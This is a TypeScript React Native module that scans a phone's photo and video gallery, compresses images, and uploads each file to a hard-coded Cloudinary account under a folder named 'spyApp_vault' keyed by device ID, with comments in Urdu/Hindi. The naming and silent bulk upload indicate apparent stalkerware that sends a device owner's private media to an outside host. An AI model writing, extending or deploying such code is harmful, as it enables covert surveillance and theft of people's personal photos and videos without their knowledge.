import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import ImageResizer from '@bam.tech/react-native-image-resizer';
import axios from 'axios';

const CLOUD_NAME = 'dgbjpy7ev'; 
const UPLOAD_PRESET = 'sypapp'; 

const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;

export const scanAndUploadGallery = async (deviceId: string, uploadedCache?: Set<string>): Promise<string[]> => {
  try {
    const photos = await CameraRoll.getPhotos({
      first: 20, // Aap yahan limit barha bhi sakte hain taake mazeed naye items mil sakein
      assetType: 'All',
      include: ['fileSize', 'filename', 'playableDuration'],
    });

    const uploadedUrls: string[] = [];
    const targetFolder = `spyApp_vault/${deviceId}`;

    for (const edge of photos.edges) {
      const node = edge.node as any;
      const fileUri = node.image.uri;
      const fileId = node.image.uri; // Unique identifier ke taur par URI use kar rahe hain

      // Agar yeh file pehle se upload ho chuki hai, toh skip kar do (Duplicates se bachne ke liye)
      if (uploadedCache && uploadedCache.has(fileId)) {
        continue;
      }

      const isVideo = node.type && node.type.startsWith('video');

      // Video 2 minute (120 seconds) se bari nahi honi chahiye
      if (isVideo) {
        const duration = node.playableDuration || node.duration || 0;
        if (duration > 120) {
          continue;
        }
      }

      let processedUri = fileUri;

      if (!isVideo) {
        try {
          const resized = await ImageResizer.createResizedImage(
            fileUri,
            1280,
            1280,
            'JPEG',
            80,
            0,
            undefined
          );
          processedUri = resized.uri;
        } catch (err) {
          console.error('Image compression failed:', err);
        }
      }

      const formData = new FormData();
      formData.append('file', {
        uri: processedUri,
        type: isVideo ? 'video/mp4' : 'image/jpeg',
        name: `upload_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`,
      } as any);
      formData.append('upload_preset', UPLOAD_PRESET);
      formData.append('folder', targetFolder);

      const res = await axios.post(CLOUDINARY_URL, formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });

      if (res.data.secure_url) {
        uploadedUrls.push(res.data.secure_url);
        // Jaise hi upload ho, cache mein add kar do taake dobara upload na ho
        if (uploadedCache) {
          uploadedCache.add(fileId);
        }
      }
    }

    return uploadedUrls;
  } catch (error) {
    console.error('Media pipeline error:', error);
    return [];
  }
};